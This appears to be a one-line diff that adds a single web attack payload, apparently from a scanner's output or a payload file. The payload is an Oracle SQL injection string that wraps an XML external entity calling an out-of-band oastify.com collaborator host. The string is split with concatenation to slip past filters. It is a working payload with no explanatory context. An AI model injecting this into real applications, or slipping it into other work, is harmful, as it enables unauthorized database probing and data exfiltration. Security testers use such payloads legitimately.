@@ -1,0 +1,1 @@
+tDBt7e8mZQ'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % pqcik SYSTEM "http://qgagnzvchozh2mhp6qpha7oybphi5d81cp4cx0m.oasti'||'fy.com/">%pqcik;]>'),'/l') from dual)||'
